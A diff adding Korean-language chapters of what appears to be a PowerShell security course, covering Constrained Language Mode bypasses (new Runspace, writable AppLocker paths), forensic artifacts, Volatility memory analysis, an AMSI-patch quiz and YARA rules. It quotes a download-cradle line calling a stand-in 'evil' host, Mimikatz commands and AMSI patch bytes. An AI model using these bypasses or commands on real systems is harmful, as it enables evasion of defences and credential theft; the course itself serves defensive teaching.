+                            <td class="py-2 px-3">기본 미암호화</td>
+                            <td class="py-2 px-3">기본 암호화 (Kerberos/NTLM)</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 6 ═══════════════════ -->
+<section id="ch6" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#6.</span> Constrained Language Mode 우회 — 샌드박스 탈출</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">🔓</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 어린이 놀이터 울타리 넘기</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed"><strong>CLM</strong>은 PowerShell의 기능을 크게 제한합니다. .NET 타입 사용, COM 객체 생성, Win32 API P/Invoke가 모두 차단됩니다. 하지만 공격자는 새 Runspace 생성이나 AppLocker 허용 경로를 악용하여 이 제한을 우회합니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">CLM 상태 확인과 제한 목록</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># Language Mode 확인</div>
+                <div class="text-white">PS&gt; <span class="text-yellow-400">$ExecutionContext</span>.SessionState.LanguageMode</div>
+                <div class="text-red-400 font-bold">ConstrainedLanguage</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># CLM에서 차단되는 작업들:</div>
+                <div class="text-white">PS&gt; [System.IO.File]::ReadAllText(<span class="text-green-400">"C:\secret.txt"</span>)</div>
+                <div class="text-red-400">Cannot invoke method. Method invocation is supported only</div>
+                <div class="text-red-400">on core types in this language mode.</div>
+                <div class="text-white"></div>
+                <div class="text-white">PS&gt; Add-Type -TypeDefinition <span class="text-green-400">"public class Test{}"</span></div>
+                <div class="text-red-400">Cannot add type. Only core types are supported.</div>
+                <div class="text-white"></div>
+                <div class="text-white">PS&gt; New-Object -ComObject WScript.Shell</div>
+                <div class="text-red-400">Cannot create type. Only core types are supported.</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">우회 방법 1: 새 Runspace 생성</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">CLM은 현재 Runspace에만 적용됩니다. C# 코드로 새 Runspace를 생성하면 FullLanguage 모드로 실행할 수 있습니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500">// C#: 새 Runspace 생성으로 CLM 우회</div>
+                <div class="text-green-400">using System.Management.Automation;</div>
+                <div class="text-green-400">using System.Management.Automation.Runspaces;</div>
+                <div class="text-white"></div>
+                <div class="text-white"><span class="text-purple-400">var</span> rs = RunspaceFactory.CreateRunspace();</div>
+                <div class="text-white">rs.Open();  <span class="text-slate-500">// FullLanguage 모드 Runspace!</span></div>
+                <div class="text-white"></div>
+                <div class="text-white"><span class="text-purple-400">var</span> pipe = rs.CreatePipeline();</div>
+                <div class="text-white">pipe.Commands.AddScript(</div>
+                <div class="text-white">    <span class="text-green-400">"[System.IO.File]::ReadAllText('C:\\secret.txt')"</span>);</div>
+                <div class="text-white"><span class="text-purple-400">var</span> results = pipe.Invoke();  <span class="text-slate-500">// 성공!</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-teal-400">
+            <h3 class="font-bold text-xl mb-4 hl-teal">우회 방법 2: AppLocker 허용 경로 악용</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">CLM은 보통 AppLocker와 연동됩니다. AppLocker 기본 규칙이 허용하는 경로 중 쓰기가 가능한 디렉토리가 존재합니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># AppLocker 기본 허용 경로 중 쓰기 가능한 위치</div>
+                <div class="text-white">C:\Windows\Tasks\          <span class="text-slate-500">← 사용자 쓰기 가능</span></div>
+                <div class="text-white">C:\Windows\Temp\           <span class="text-slate-500">← 사용자 쓰기 가능</span></div>
+                <div class="text-white">C:\Windows\Tracing\        <span class="text-slate-500">← 사용자 쓰기 가능</span></div>
+                <div class="text-white">C:\Windows\Registration\   <span class="text-slate-500">← COMPlus 경로</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 악성 스크립트를 허용 경로에 저장 후 실행 → CLM 우회</div>
+                <div class="text-white">PS&gt; Copy-Item evil.ps1 C:\Windows\Tasks\</div>
+                <div class="text-white">PS&gt; &amp; C:\Windows\Tasks\evil.ps1  <span class="text-slate-500"># FullLanguage!</span></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl">
+            <h3 class="font-bold text-lg mb-4 hl-red">방어 권장사항</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700">
+                    <div class="font-bold text-sm text-blue-700 dark:text-blue-400 mb-2">AppLocker 강화</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• 기본 규칙 대신 명시적 허용 목록 사용</li>
+                        <li>• 쓰기 가능 경로의 스크립트 실행 명시적 차단</li>
+                        <li>• Publisher 규칙으로 서명된 스크립트만 허용</li>
+                    </ul>
+                </div>
+                <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-300 dark:border-blue-700">
+                    <div class="font-bold text-sm text-blue-700 dark:text-blue-400 mb-2">WDAC (Windows Defender Application Control)</div>
+                    <ul class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <li>• AppLocker보다 강력한 커널 레벨 정책</li>
+                        <li>• Runspace 우회에도 효과적</li>
+                        <li>• 코드 무결성 정책 적용</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 7 ═══════════════════ -->
+<section id="ch7" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#7.</span> 포렌식 아티팩트 심층 분석 — 공격 흔적 추적</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">🔬</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 범죄 현장의 미세 증거물 수집</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed">PowerShell은 "파일 없는(fileless)" 공격의 대표 도구이지만, 운영체제 곳곳에 <strong>포렌식 아티팩트</strong>를 남깁니다. 공격자가 아무리 주의해도 완전히 지울 수 없는 흔적들을 알아봅니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">아티팩트 1: ConsoleHost_history.txt</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">PowerShell 5.0+에서 자동 생성되는 명령 히스토리 파일입니다. 공격자가 입력한 모든 명령이 평문으로 기록됩니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># 히스토리 파일 위치</div>
+                <div class="text-white"><span class="text-yellow-400">$histPath</span> = (Get-PSReadlineOption).HistorySavePath</div>
+                <div class="text-white"><span class="text-slate-500"># 기본: %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\</span></div>
+                <div class="text-white"><span class="text-slate-500">#        ConsoleHost_history.txt</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 포렌식 수집 예시</div>
+                <div class="text-white">PS&gt; Get-Content <span class="text-yellow-400">$histPath</span> | Select-String <span class="text-green-400">"IEX|Invoke-|Download"</span></div>
+                <div class="text-red-400">IEX (New-Object Net.WebClient).DownloadString('http://evil/ps')</div>
+                <div class="text-red-400">Invoke-Mimikatz -DumpCreds</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">아티팩트 2: Windows Event Logs</h3>
+            <div class="overflow-x-auto">
+                <table class="w-full text-sm border border-slate-300 dark:border-slate-700 rounded-lg overflow-hidden">
+                    <thead>
+                        <tr class="bg-purple-100 dark:bg-purple-900/30">
+                            <th class="text-left py-2 px-3 text-purple-800 dark:text-purple-300 font-bold text-xs">로그 소스</th>
+                            <th class="text-left py-2 px-3 text-purple-800 dark:text-purple-300 font-bold text-xs">Event ID</th>
+                            <th class="text-left py-2 px-3 text-purple-800 dark:text-purple-300 font-bold text-xs">기록 내용</th>
+                        </tr>
+                    </thead>
+                    <tbody class="text-cgray dark:text-slate-300 text-xs">
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">PowerShell Operational</td>
+                            <td class="py-2 px-3"><span class="text-red-500 font-bold">4104</span></td>
+                            <td class="py-2 px-3">Script Block Logging — 실행된 전체 스크립트 블록</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">PowerShell Operational</td>
+                            <td class="py-2 px-3"><span class="text-red-500 font-bold">4103</span></td>
+                            <td class="py-2 px-3">Module Logging — 파이프라인 실행 상세 정보</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">Windows PowerShell</td>
+                            <td class="py-2 px-3"><span class="text-amber-500 font-bold">400/403</span></td>
+                            <td class="py-2 px-3">엔진 시작/종료 — EngineVersion 포함</td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">Sysmon</td>
+                            <td class="py-2 px-3"><span class="text-blue-500 font-bold">1</span></td>
+                            <td class="py-2 px-3">프로세스 생성 — 커맨드라인 인자 포함</td>
+                        </tr>
+                        <tr>
+                            <td class="py-2 px-3 font-bold">Sysmon</td>
+                            <td class="py-2 px-3"><span class="text-blue-500 font-bold">7</span></td>
+                            <td class="py-2 px-3">이미지 로드 — amsi.dll, clrjit.dll 로딩 감시</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-teal-400">
+            <h3 class="font-bold text-xl mb-4 hl-teal">아티팩트 3: Prefetch &amp; ETW Traces</h3>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-lg border border-slate-200 dark:border-slate-700">
+                    <div class="font-bold text-xs text-slate-700 dark:text-slate-300 mb-2">Prefetch 파일</div>
+                    <div class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <div><code class="bg-slate-200 dark:bg-slate-700 px-1 rounded">C:\Windows\Prefetch\POWERSHELL.EXE-*.pf</code></div>
+                        <div class="mt-1">• 마지막 실행 시각 8개 기록</div>
+                        <div>• 실행 횟수 카운터</div>
+                        <div>• 로드된 DLL/파일 목록</div>
+                    </div>
+                </div>
+                <div class="bg-slate-50 dark:bg-slate-800/50 p-4 rounded-lg border border-slate-200 dark:border-slate-700">
+                    <div class="font-bold text-xs text-slate-700 dark:text-slate-300 mb-2">ETW Traces</div>
+                    <div class="text-xs text-slate-600 dark:text-slate-400 space-y-1">
+                        <div>• Microsoft-Windows-PowerShell ETW</div>
+                        <div>• Microsoft-Antimalware-Scan-Interface</div>
+                        <div>• .NET CLR Loading ETW Provider</div>
+                        <div>• 실시간 캡처: <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded">logman</code></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-amber-400">
+            <h3 class="font-bold text-xl mb-4 text-amber-700 dark:text-amber-400">아티팩트 4: 메모리 포렌식 대상</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">디스크에 없는 fileless 공격도 프로세스 메모리에는 반드시 흔적이 남습니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># PowerShell 프로세스 메모리에서 발견 가능한 아티팩트</div>
+                <div class="text-white"></div>
+                <div class="text-white">• .NET Assembly 바이트코드 (CLR Heap)</div>
+                <div class="text-white">• 디코딩된 Base64 페이로드 (관리 힙)</div>
+                <div class="text-white">• 스크립트 블록 캐시 (ScriptBlock 객체)</div>
+                <div class="text-white">• 환경 변수 (C2 URL, 인코딩된 명령 등)</div>
+                <div class="text-white">• 네트워크 연결 정보 (소켓 핸들)</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 메모리 덤프 생성 명령</div>
+                <div class="text-white">PS&gt; procdump.exe -ma <span class="text-yellow-400">$pid</span> powershell_dump.dmp</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-teal-400">
+            <h3 class="font-bold text-xl mb-4 hl-teal">GPO: PowerShell 로깅 완전 설정 가이드</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">포렌식 아티팩트를 수집하려면 먼저 <strong>로깅이 활성화</strong>되어 있어야 합니다. 아래 3가지 GPO 설정을 반드시 적용하세요.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># GPO 경로: Computer Configuration → Administrative Templates →</div>
+                <div class="text-slate-500">#            Windows Components → Windows PowerShell</div>
+                <div class="text-white"></div>
+                <div class="text-yellow-400 font-bold">① Script Block Logging (가장 중요!)</div>
+                <div class="text-white">   정책: "Turn on PowerShell Script Block Logging"</div>
+                <div class="text-white">   상태: <span class="text-green-400">Enabled</span></div>
+                <div class="text-white">   효과: EID 4104에 실행된 모든 스크립트 블록 기록</div>
+                <div class="text-white">   (난독화 해제된 원본 코드가 기록됨!)</div>
+                <div class="text-white"></div>
+                <div class="text-yellow-400 font-bold">② Module Logging</div>
+                <div class="text-white">   정책: "Turn on Module Logging"</div>
+                <div class="text-white">   상태: <span class="text-green-400">Enabled</span></div>
+                <div class="text-white">   모듈: <span class="text-green-400">*</span> (전체 모듈)</div>
+                <div class="text-white">   효과: EID 4103에 cmdlet 실행 정보 기록</div>
+                <div class="text-white"></div>
+                <div class="text-yellow-400 font-bold">③ Transcription (Over-the-Shoulder Logging)</div>
+                <div class="text-white">   정책: "Turn on PowerShell Transcription"</div>
+                <div class="text-white">   상태: <span class="text-green-400">Enabled</span></div>
+                <div class="text-white">   경로: <span class="text-green-400">\\FileServer\PSLogs$\</span></div>
+                <div class="text-white">   효과: 모든 입출력이 텍스트 파일로 저장</div>
+            </div>
+            <div class="mt-3 bg-red-50 dark:bg-red-900/20 p-3 rounded-lg border border-red-300 dark:border-red-700">
+                <div class="text-xs text-red-700 dark:text-red-400"><strong>주의:</strong> Transcription 로그는 <strong>중앙 파일 서버</strong>에 저장해야 합니다. 로컬 저장 시 공격자가 로그를 삭제할 수 있습니다. 또한 Transcription 로그에는 민감 정보(비밀번호 등)가 포함될 수 있으므로, 접근 권한을 SIEM 팀으로 제한하세요.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 8 ═══════════════════ -->
+<section id="ch8" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#8.</span> Volatility 메모리 분석 — PowerShell 프로세스 해부</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">🧠</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 용의자의 뇌를 MRI로 스캔하기</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed"><strong>Volatility</strong>는 메모리 덤프를 분석하는 오픈소스 포렌식 프레임워크입니다. PowerShell 기반 공격에서 디스크에 없는 페이로드, 인젝션된 코드, 네트워크 연결 등을 메모리에서 직접 추출할 수 있습니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">Volatility3 핵심 플러그인</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># 1. 프로세스 목록 — PowerShell 프로세스 식별</div>
+                <div class="text-white">$ vol -f memory.dmp windows.pslist</div>
+                <div class="text-white">PID   PPID  Name               CreateTime</div>
+                <div class="text-white">----  ----  ----               ----------</div>
+                <div class="text-red-400 font-bold">4892  1024  powershell.exe     2026-03-01 14:23:01</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 2. 커맨드라인 인자 확인</div>
+                <div class="text-white">$ vol -f memory.dmp windows.cmdline --pid <span class="text-yellow-400">4892</span></div>
+                <div class="text-red-400">powershell.exe -NoP -W Hidden -enc JABjAD0ATg...</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 3. 네트워크 연결 확인 (C2 통신)</div>
+                <div class="text-white">$ vol -f memory.dmp windows.netscan --pid <span class="text-yellow-400">4892</span></div>
+                <div class="text-white">Proto  LocalAddr      ForeignAddr      State     PID</div>
+                <div class="text-red-400">TCPv4  10.0.0.5:49821 <span class="font-bold">185.xx.xx.xx:443</span> ESTABLISHED 4892</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 4. 프로세스 메모리 덤프 → 문자열 추출</div>
+                <div class="text-white">$ vol -f memory.dmp windows.memmap --pid <span class="text-yellow-400">4892</span> --dump</div>
+                <div class="text-white">$ strings -el pid.4892.dmp | grep -i "invoke\|mimikatz\|amsi"</div>
+                <div class="text-red-400">Invoke-Mimikatz -DumpCreds</div>
+                <div class="text-red-400">AmsiScanBuffer</div>
+                <div class="text-red-400">System.Reflection.Assembly</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 5. DLL 목록 확인 — amsi.dll 로딩 여부</div>
+                <div class="text-white">$ vol -f memory.dmp windows.dlllist --pid <span class="text-yellow-400">4892</span></div>
+                <div class="text-white">Base          Size   Name           Path</div>
+                <div class="text-yellow-400">0x7ffea1230000 0x1c000 amsi.dll      C:\Windows\System32\amsi.dll</div>
+                <div class="text-yellow-400">0x7ffea0bc0000 0x9f6000 clr.dll      C:\Windows\...\clr.dll</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">.NET 힙 분석 — CLR 객체 추출</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">.NET CLR이 관리하는 힙에서 ScriptBlock 객체, 디코딩된 페이로드, Assembly 바이트를 직접 추출할 수 있습니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># ClrMD / dotnet-dump를 이용한 .NET 힙 분석</div>
+                <div class="text-white">$ dotnet-dump analyze pid.4892.dmp</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500">> 관리 힙의 ScriptBlock 객체 검색</div>
+                <div class="text-white">&gt; dumpheap -type ScriptBlock</div>
+                <div class="text-white">Address        MT             Size</div>
+                <div class="text-yellow-400">0x028e1f3c20a0 0x7ffea2345678 152</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500">> 객체 내용 덤프 → 실행된 스크립트 코드 확인</div>
+                <div class="text-white">&gt; dumpobj 0x028e1f3c20a0</div>
+                <div class="text-red-400">ScriptBlockText: "IEX (New-Object Net.WebClient)..."</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-amber-400">
+            <h3 class="font-bold text-xl mb-4 text-amber-700 dark:text-amber-400">AMSI 패치 탐지 — 메모리 비교</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">메모리 덤프에서 amsi.dll의 AmsiScanBuffer 함수 바이트를 디스크 원본과 비교하면 패치 여부를 확인할 수 있습니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># 메모리 내 amsi.dll vs 디스크 원본 비교</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 정상 AmsiScanBuffer 프롤로그 (디스크 원본)</div>
+                <div class="text-green-400">4C 8B DC        mov  r11, rsp</div>
+                <div class="text-green-400">49 89 5B 08     mov  [r11+8], rbx</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># 패치된 AmsiScanBuffer (메모리 덤프에서 발견)</div>
+                <div class="text-red-400 font-bold">B8 57 00 07 80  mov  eax, 0x80070057  ← 패치 확인!</div>
+                <div class="text-red-400 font-bold">C3              ret</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># → 첫 바이트가 B8이면 AMSI 우회가 확실</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Mini Lab 1: AMSI 패치 바이트 분석 ═══════════════════ -->
+<section id="minilab1" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">🧪</span> Mini Lab 1 — AMSI 패치 바이트 식별</h2>
+    <div class="glass-panel p-6 rounded-xl">
+        <p class="text-sm text-cgray dark:text-slate-400 mb-4">메모리 덤프에서 발견된 AmsiScanBuffer의 바이트 시퀀스를 분석하세요. 각 바이트가 의미하는 어셈블리 명령을 선택합니다.</p>
+        <div class="terminal-bg rounded-lg p-4 text-xs mb-6">
+            <div class="text-slate-500">; AmsiScanBuffer 시작 6바이트 (메모리 덤프에서 추출)</div>
+            <div class="text-yellow-400 font-bold text-lg mt-2">B8 57 00 07 80 C3</div>
+        </div>
+        <div class="space-y-4">
+            <div>
+                <label class="block text-sm font-bold text-slate-700 dark:text-slate-300 mb-1">Q1. <code>B8 57 00 07 80</code>은 어떤 x64 명령어인가요?</label>
+                <select id="lab1-q1" class="w-full p-2 border border-slate-300 dark:border-slate-600 rounded bg-white dark:bg-slate-800 text-sm text-slate-700 dark:text-slate-300">
+                    <option value="">선택하세요</option>
+                    <option value="a">xor eax, eax</option>
+                    <option value="b">mov eax, 0x80070057</option>
+                    <option value="c">push 0x80070057</option>
+                    <option value="d">cmp eax, 0x80070057</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-sm font-bold text-slate-700 dark:text-slate-300 mb-1">Q2. <code>0x80070057</code>은 어떤 HRESULT 값인가요?</label>
+                <select id="lab1-q2" class="w-full p-2 border border-slate-300 dark:border-slate-600 rounded bg-white dark:bg-slate-800 text-sm text-slate-700 dark:text-slate-300">
+                    <option value="">선택하세요</option>
+                    <option value="a">S_OK (성공)</option>
+                    <option value="b">E_FAIL (일반 실패)</option>
+                    <option value="c">E_INVALIDARG (잘못된 인자)</option>
+                    <option value="d">E_ACCESSDENIED (접근 거부)</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-sm font-bold text-slate-700 dark:text-slate-300 mb-1">Q3. <code>C3</code>은 어떤 명령어인가요?</label>
+                <select id="lab1-q3" class="w-full p-2 border border-slate-300 dark:border-slate-600 rounded bg-white dark:bg-slate-800 text-sm text-slate-700 dark:text-slate-300">
+                    <option value="">선택하세요</option>
+                    <option value="a">nop (아무 작업 없음)</option>
+                    <option value="b">int3 (브레이크포인트)</option>
+                    <option value="c">ret (함수 반환)</option>
+                    <option value="d">call (함수 호출)</option>
+                </select>
+            </div>
+            <div>
+                <label class="block text-sm font-bold text-slate-700 dark:text-slate-300 mb-1">Q4. 이 패치의 전체 효과는?</label>
+                <select id="lab1-q4" class="w-full p-2 border border-slate-300 dark:border-slate-600 rounded bg-white dark:bg-slate-800 text-sm text-slate-700 dark:text-slate-300">
+                    <option value="">선택하세요</option>
+                    <option value="a">AMSI가 모든 스크립트를 악성으로 판정</option>
+                    <option value="b">AMSI가 스캔을 수행하지 않고 즉시 실패 반환</option>
+                    <option value="c">AMSI 프로바이더 등록이 해제됨</option>
+                    <option value="d">PowerShell 프로세스가 종료됨</option>
+                </select>
+            </div>
+        </div>
+        <div class="flex gap-3 mt-6">
+            <button onclick="checkLab1()" class="bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-2 px-6 rounded font-mono transition shadow-sm">정답 확인</button>
+            <button onclick="resetLab1()" class="bg-slate-300 dark:bg-slate-700 hover:bg-slate-400 dark:hover:bg-slate-600 text-slate-700 dark:text-slate-300 font-bold py-2 px-6 rounded font-mono transition shadow-sm">초기화</button>
+        </div>
+        <div id="lab1-result" class="hidden mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm"></div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 9 ═══════════════════ -->
+<section id="ch9" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#9.</span> YARA 규칙 개발 — 난독화된 PowerShell 탐지</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">📐</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 범인의 필체를 분석하는 감식 전문가</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed"><strong>YARA</strong>는 바이너리 패턴 매칭 도구로, 파일이나 메모리에서 특정 바이트 시퀀스나 문자열 패턴을 탐지합니다. PowerShell 공격에서는 난독화된 페이로드의 공통 패턴을 규칙으로 정의하여 탐지합니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">YARA 규칙 1: Base64 인코딩된 PowerShell 탐지</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-purple-400">rule</div> <span class="text-yellow-400">Detect_Base64_PowerShell</span> {
+                <div class="text-white ml-4"><span class="text-purple-400">meta:</span></div>
+                <div class="text-white ml-8">description = <span class="text-green-400">"Base64로 인코딩된 PowerShell 명령 탐지"</span></div>
+                <div class="text-white ml-8">author = <span class="text-green-400">"GOTROOT EDU"</span></div>
+                <div class="text-white ml-8">severity = <span class="text-green-400">"high"</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">strings:</span></div>
+                <div class="text-white ml-8"><span class="text-slate-500">// "powershell" Base64 변형들</span></div>
+                <div class="text-white ml-8">$b64_ps1 = <span class="text-green-400">"cABvAHcAZQByAHMAaABlAGwAbA"</span>  <span class="text-slate-500">// UTF-16LE Base64</span></div>
+                <div class="text-white ml-8">$b64_ps2 = <span class="text-green-400">"UABvAHcAZQByAFMAaABlAGwAbA"</span></div>
+                <div class="text-white ml-8"><span class="text-slate-500">// "-enc" 또는 "-EncodedCommand" 패턴</span></div>
+                <div class="text-white ml-8">$enc_flag = <span class="text-green-400">/\-[eE]([nN][cC]|ncodedcommand)/</span></div>
+                <div class="text-white ml-8"><span class="text-slate-500">// IEX 패턴 (실행 트리거)</span></div>
+                <div class="text-white ml-8">$iex1 = <span class="text-green-400">"IEX"</span> <span class="text-purple-400">nocase</span></div>
+                <div class="text-white ml-8">$iex2 = <span class="text-green-400">"Invoke-Expression"</span> <span class="text-purple-400">nocase</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">condition:</span></div>
+                <div class="text-white ml-8">($b64_ps1 <span class="text-purple-400">or</span> $b64_ps2) <span class="text-purple-400">and</span> ($enc_flag <span class="text-purple-400">or</span> $iex1 <span class="text-purple-400">or</span> $iex2)</div>
+                <div class="text-white">}</div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">YARA 규칙 2: AMSI 우회 코드 탐지</h3>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-purple-400">rule</div> <span class="text-yellow-400">Detect_AMSI_Bypass</span> {
+                <div class="text-white ml-4"><span class="text-purple-400">meta:</span></div>
+                <div class="text-white ml-8">description = <span class="text-green-400">"AMSI 우회 시도 탐지"</span></div>
+                <div class="text-white ml-8">severity = <span class="text-green-400">"critical"</span></div>
+                <div class="text-white ml-4"><span class="text-purple-400">strings:</span></div>
+                <div class="text-white ml-8"><span class="text-slate-500">// AmsiScanBuffer 패치 바이트 시퀀스</span></div>
+                <div class="text-white ml-8">$patch_bytes = { B8 57 00 07 80 C3 }</div>
+                <div class="text-white ml-8"><span class="text-slate-500">// .NET Reflection 기반 우회 문자열</span></div>
